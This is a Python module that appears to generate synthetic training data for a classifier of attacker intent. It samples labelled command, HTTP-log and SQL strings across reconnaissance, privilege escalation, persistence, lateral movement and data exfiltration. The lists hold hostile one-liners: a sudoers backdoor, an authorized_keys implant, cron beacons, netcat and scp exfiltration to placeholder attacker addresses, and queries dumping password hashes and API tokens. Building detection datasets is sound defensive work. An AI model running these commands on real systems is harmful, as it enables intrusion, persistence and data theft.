from __future__ import annotations

from datetime import datetime, timedelta, timezone
from random import Random
from typing import Final

from core.intent_taxonomy import INTENT_CLASSES


RECON_COMMANDS: Final[list[str]] = [
    "whoami",
    "uname -a",
    "hostnamectl",
    "ip a",
    "ifconfig -a",
    "netstat -tulpn",
    "ss -plant",
    "ps aux",
    "tasklist /v",
    "find / -name '*.env'",
    "find /var/www -type f -maxdepth 2",
    "cat /etc/passwd",
    "ls -la /var/www",
    "curl -I http://target.local/admin",
    "wget http://target.local/.git/config -O -",
    "nmap -sV 10.0.0.0/24",
]

RECON_HTTP: Final[list[str]] = [
    'GET /admin HTTP/1.1" 404',
    'GET /debug HTTP/1.1" 200',
    'GET /.git/config HTTP/1.1" 200',
    'GET /api/status?verbose=1 HTTP/1.1" 200',
    'GET /metrics HTTP/1.1" 403',
    'GET /backup HTTP/1.1" 404',
]

RECON_DB: Final[list[str]] = [
    "SELECT table_name FROM information_schema.tables",
    "SHOW DATABASES",
    "SHOW TABLES",
    "SELECT * FROM pg_catalog.pg_tables",
    "DESCRIBE users",
    "SELECT @@version",
]

PRIVESC_COMMANDS: Final[list[str]] = [
    "sudo -l",
    "sudo su -",
    "sudo /bin/bash",
    "chmod +s /tmp/bash",
    "setcap cap_setuid+ep /tmp/python3",
    "cat /etc/sudoers",
    "visudo",
    "runas /user:administrator cmd.exe",
    "whoami /priv",
    "getsystem",
    "passwd root",
    "echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers",
]

PRIVESC_HTTP: Final[list[str]] = [
    'POST /admin/users/role HTTP/1.1" 200',
    'POST /session/impersonate HTTP/1.1" 403',
    'POST /token/elevate HTTP/1.1" 200',
    'PATCH /admin/users/42/role HTTP/1.1" 200',
    'POST /sudo/session HTTP/1.1" 401',
]

PRIVESC_DB: Final[list[str]] = [
    "GRANT ALL PRIVILEGES ON *.* TO attacker",
    "ALTER ROLE app_admin WITH SUPERUSER",
    "CREATE USER svc_persist WITH SUPERUSER",
    "SET ROLE postgres",
    "EXEC xp_cmdshell 'whoami'",
]

PERSIST_COMMANDS: Final[list[str]] = [
    "echo '* * * * * /tmp/beacon.sh' | crontab -",
    "crontab -l",
    "systemctl enable updater.service",
    "systemctl enable sshd.service",
    "schtasks /create /sc minute /tn updater /tr payload.exe",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d C:\\payload.exe",
    "echo ssh-rsa AAAAB3Nza... >> ~/.ssh/authorized_keys",
    "cp payload /etc/rc.local",
    "launchctl load ~/Library/LaunchAgents/com.updater.plist",
    "wmic startup get caption,command",
]

PERSIST_HTTP: Final[list[str]] = [
    'POST /jobs/schedule HTTP/1.1" 200',
    'PUT /keys/authorized HTTP/1.1" 201',
    'POST /cron/install HTTP/1.1" 200',
    'PUT /startup/agent HTTP/1.1" 201',
]

PERSIST_DB: Final[list[str]] = [
    "CREATE TRIGGER sync_beacon AFTER INSERT ON users",
    "CREATE EVENT persist_job ON SCHEDULE EVERY 5 MINUTE DO SELECT 1",
    "CREATE FUNCTION startup_hook() RETURNS trigger LANGUAGE plpgsql",
    "ALTER SYSTEM SET archive_mode = on",
]

LATERAL_COMMANDS: Final[list[str]] = [
    "ssh admin@10.0.0.12",
    "scp secrets.tar admin@10.0.0.8:/tmp/",
    "sftp admin@10.0.0.9",
    "psexec \\\\10.0.0.15 cmd.exe",
    "wmic /node:10.0.0.14 process call create cmd.exe",
    "net use \\\\10.0.0.20\\c$",
    "smbclient //10.0.0.18/share -U attacker",
    "winrm enumerate winrm/config/listener",
    "mstsc /v:10.0.0.10",
    "mount -t cifs //10.0.0.11/share /mnt/share",
]

LATERAL_HTTP: Final[list[str]] = [
    'POST /remote/node/connect HTTP/1.1" 200',
    'GET /internal/share HTTP/1.1" 200',
    'POST /ssh/session HTTP/1.1" 201',
    'GET /rdp/tunnel HTTP/1.1" 200',
]

LATERAL_DB: Final[list[str]] = [
    "SELECT * FROM dblink('host=10.0.0.8 dbname=prod', 'SELECT 1')",
    "SELECT * FROM OPENQUERY(remote_server, 'SELECT @@version')",
    "SELECT * FROM linked_server.master.sys.databases",
]

EXFIL_COMMANDS: Final[list[str]] = [
    "tar -czf /tmp/data.tgz /srv/data",
    "zip -r /tmp/archive.zip /home/app",
    "gzip -c dump.sql > dump.sql.gz",
    "base64 /tmp/records.csv > /tmp/records.b64",
    "aws s3 cp dump.sql s3://bucket/dump.sql",
    "scp /tmp/data.tgz attacker@198.51.100.2:/drop/",
    "rsync -avz /srv/data attacker@198.51.100.3:/loot/",
    "curl -F file=@dump.sql https://files.example/upload",
    "nc 198.51.100.10 4444 < /tmp/payroll.csv",
]

EXFIL_HTTP: Final[list[str]] = [
    'GET /reports/export HTTP/1.1" 200',
    'POST /download/archive HTTP/1.1" 200',
    'GET /dump HTTP/1.1" 200',
    'POST /archive/upload HTTP/1.1" 201',
]

EXFIL_DB: Final[list[str]] = [
    "SELECT * FROM customer_records",
    "COPY (SELECT * FROM payroll) TO '/tmp/payroll.csv'",
    "SELECT password_hash FROM users UNION SELECT token FROM api_keys",
    "SELECT * INTO OUTFILE '/tmp/export.csv' FROM transactions",
]


INTENT_PROFILES: Final[dict[str, dict[str, object]]] = {
    "reconnaissance": {
        "commands": RECON_COMMANDS,
        "http": RECON_HTTP,
        "db": RECON_DB,
        "raw_terms": ["enumeration", "scan", "discovery", "inventory", "recon"],
        "timing": {"count": 7, "spacing": (1, 3)},
        "command_count": (3, 5),
        "http_count": (2, 4),
        "db_count": (1, 2),
    },
    "privilege_escalation": {
        "commands": PRIVESC_COMMANDS,
        "http": PRIVESC_HTTP,
        "db": PRIVESC_DB,
        "raw_terms": ["elevate", "administrator", "root", "token abuse", "impersonation"],
        "timing": {"count": 6, "spacing": (3, 8)},
        "command_count": (3, 4),
        "http_count": (1, 2),
        "db_count": (1, 2),
    },
    "persistence": {
        "commands": PERSIST_COMMANDS,
        "http": PERSIST_HTTP,
        "db": PERSIST_DB,
        "raw_terms": ["scheduled task", "autorun", "startup", "beacon", "persistence"],
        "timing": {"count": 5, "spacing": (20, 60)},
        "command_count": (2, 4),
        "http_count": (1, 2),
        "db_count": (1, 2),
    },
    "lateral_movement": {
        "commands": LATERAL_COMMANDS,
        "http": LATERAL_HTTP,
        "db": LATERAL_DB,
        "raw_terms": ["pivot", "remote host", "smb", "winrm", "lateral"],
        "timing": {"count": 6, "spacing": (5, 12)},
        "command_count": (3, 5),
        "http_count": (1, 2),
        "db_count": (1, 2),
    },
    "data_exfiltration": {
        "commands": EXFIL_COMMANDS,
        "http": EXFIL_HTTP,
        "db": EXFIL_DB,
        "raw_terms": ["archive", "compress", "upload", "exfiltrate", "sensitive data"],
        "timing": {"count": 8, "spacing": (1, 2)},
        "command_count": (3, 5),
        "http_count": (1, 3),
        "db_count": (1, 2),
    },
}


def _timestamps(rand: Random, count: int, spacing_bounds: tuple[int, int]) -> list[str]:
    current = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc)
    output: list[str] = []
    min_spacing, max_spacing = spacing_bounds
    for _ in range(max(count, 1)):
        current += timedelta(seconds=rand.randint(min_spacing, max_spacing))
        output.append(current.isoformat())
    return output


def _pick_many(rand: Random, values: list[str], bounds: tuple[int, int]) -> list[str]:
    count = rand.randint(bounds[0], bounds[1])
    return rand.sample(values, k=min(count, len(values)))


def _sample(rand: Random, label: str, variation: int) -> dict[str, object]:
    profile = INTENT_PROFILES[label]
    commands = _pick_many(rand, list(profile["commands"]), profile["command_count"])
    http_logs = _pick_many(rand, list(profile["http"]), profile["http_count"])
    db_queries = _pick_many(rand, list(profile["db"]), profile["db_count"])
    raw_terms = list(profile["raw_terms"])

    if label == "reconnaissance":
        commands.append(rand.choice(["dir /s C:\\inetpub", "curl http://target.local/api/users"]))
    elif label == "privilege_escalation":
        commands.append(rand.choice(["sudo -S id", "echo attacker:Passw0rd! | chpasswd"]))
    elif label == "persistence":
        commands.append(rand.choice(["cp payload /usr/local/bin/updater", "systemctl daemon-reload"]))
    elif label == "lateral_movement":
        commands.append(rand.choice(["ssh -i id_rsa app@10.0.0.21", "net use \\\\10.0.0.22\\ipc$ /user:svc"]))
    elif label == "data_exfiltration":
        commands.append(rand.choice(["split -b 10M dump.sql archive.part", "curl -X POST https://files.example/upload -F data=@archive.zip"]))

    raw_activity = " ".join(raw_terms + [f"variant_{variation}"])
    timing_profile = profile["timing"]

    return {
        "commands": commands,
        "http_logs": http_logs,
        "db_queries": db_queries,
        "event_timestamps": _timestamps(rand, timing_profile["count"], timing_profile["spacing"]),
        "raw_activity": raw_activity,
    }


def build_training_dataset(seed: int = 42, samples_per_intent: int = 120) -> list[dict[str, object]]:
    rand = Random(seed)
    dataset: list[dict[str, object]] = []

    for label in INTENT_CLASSES:
        for variation in range(samples_per_intent):
            sample = _sample(rand, label, variation)
            sample["label"] = label
            dataset.append(sample)

    rand.shuffle(dataset)
    return dataset
